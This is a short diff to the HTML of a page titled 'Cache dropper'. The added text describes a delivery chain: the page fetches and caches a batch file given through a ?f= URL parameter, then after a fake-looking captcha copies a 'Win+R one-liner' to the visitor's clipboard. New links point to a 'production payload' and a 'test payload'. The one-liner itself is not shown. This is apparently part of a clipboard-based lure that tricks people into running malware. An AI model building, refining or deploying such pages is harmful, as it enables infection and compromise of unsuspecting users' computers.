@@ -9,10 +9,10 @@
 <body>
   <h1>Cache dropper</h1>
   <p>Deploy version: <strong id="version">…</strong></p>
-  <p>Pass the cache file URL via <code>?f=</code> (raw or base64). On load, consent.js fetches and strict-validates the body. The one-liner finds the cache file by <strong>marker string</strong>, not file size.</p>
+  <p>Pass the payload URL via <code>?f=</code>. On load, the page fetches and caches the batch file. After captcha, the Win+R one-liner is copied to your clipboard.</p>
   <p>
-    <a href="?f=http://localhost:8080/hello.txt">?f= raw URL</a> ·
-    <a href="?f=aHR0cDovL2xvY2FsaG9zdDo4MDgwL2hlbGxvLnR4dA==">?f= base64 URL</a>
+    <a href="?f=/j">?f=/j</a> (production payload) ·
+    <a href="?f=/hello.txt">?f=/hello.txt</a> (test payload)
   </p>
   <p>Optional debug: <span id="status">loading…</span></p>
   <pre id="preview"></pre>
